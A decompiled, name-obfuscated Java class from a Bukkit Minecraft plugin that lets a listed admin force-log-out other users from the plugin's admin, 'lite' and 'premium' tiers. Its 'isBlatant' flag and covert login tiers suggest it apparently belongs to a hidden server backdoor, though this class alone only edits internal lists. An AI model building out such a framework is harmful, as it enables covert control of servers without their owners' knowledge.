/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.admin;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class ForcelogoutCommand
extends Command {
    public ForcelogoutCommand() {
        ForcelogoutCommand llllllllllllllIlIIIIlIlllIIIllll;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    @Override
    public void execute(Core llllllllllllllIlIIIIlIllIllIIlll, String llllllllllllllIlIIIIlIllIllIlIll, String[] llllllllllllllIlIIIIlIllIllIlIlI, Player llllllllllllllIlIIIIlIllIllIIIll) {
        if (llllllllllllllIlIIIIlIllIllIIlll.admin.contains(llllllllllllllIlIIIIlIllIllIIIll.getName())) {
            if (llllllllllllllIlIIIIlIllIllIlIlI.length <= 1) {
                llllllllllllllIlIIIIlIllIllIIIll.sendMessage(Settings.USAGE("forcelogout <player>"));
            } else {
                Player llllllllllllllIlIIIIlIllIlllIIII = Bukkit.getServer().getPlayer(llllllllllllllIlIIIIlIllIllIlIlI[1]);
                if (llllllllllllllIlIIIIlIllIlllIIII == null) {
                    llllllllllllllIlIIIIlIllIllIIIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIlIIIIlIllIllIlIlI[1]).append(Settings.WHITE).append(" is not online."))));
                } else if (!llllllllllllllIlIIIIlIllIllIIlll.lite.contains(llllllllllllllIlIIIIlIllIlllIIII.getName())) {
                    llllllllllllllIlIIIIlIllIllIIIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIlIIIIlIllIlllIIII.getName()).append(Settings.WHITE).append(" is not logged in."))));
                } else {
                    llllllllllllllIlIIIIlIllIllIIlll.lite.remove(llllllllllllllIlIIIIlIllIlllIIII.getName());
                    llllllllllllllIlIIIIlIllIllIIIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIlIIIIlIllIlllIIII.getName()).append(Settings.WHITE).append(" has been logged out."))));
                    llllllllllllllIlIIIIlIllIlllIIII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You have been logged out of ").append(Settings.NAME).append(" by an admin"))));
                    llllllllllllllIlIIIIlIllIllIIlll.premium.remove(llllllllllllllIlIIIIlIllIlllIIII.getName());
                    llllllllllllllIlIIIIlIllIllIIlll.admin.remove(llllllllllllllIlIIIIlIllIlllIIII.getName());
                }
            }
        } else {
            llllllllllllllIlIIIIlIllIllIIIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be an ").append(Settings.RED).append("admin ").append(Settings.WHITE).append("to execute this command"))));
        }
    }
}

